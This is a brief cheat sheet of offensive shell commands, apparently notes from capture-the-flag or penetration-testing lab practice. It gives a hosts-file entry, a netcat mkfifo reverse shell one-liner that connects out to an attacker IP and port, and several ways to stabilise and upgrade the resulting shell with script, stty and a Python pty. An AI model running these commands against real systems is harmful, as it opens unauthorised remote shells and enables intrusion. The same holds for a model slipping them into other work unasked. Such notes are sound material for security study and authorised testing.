Add to hosts file (`/etc/hosts`):
`<ip addr> [tab] <hostname>`
e.g. `192.168.131.47  alvida-eatery.org`

Reverse shell:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 80 >/tmp/f`
- if it doesn't work, try `/bin/bash` instead of `/bin/sh`

Stabilize reverse shell:
`/usr/bin/script -qc /bin/bash /dev/null` (run this in the reverse shell)

Stable shell 2:
```
script /dev/null -c bash 
# Ctrl + z 
stty -raw echo; fg 
# Enter (Return) x2
```

Upgrade shell:
`python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color`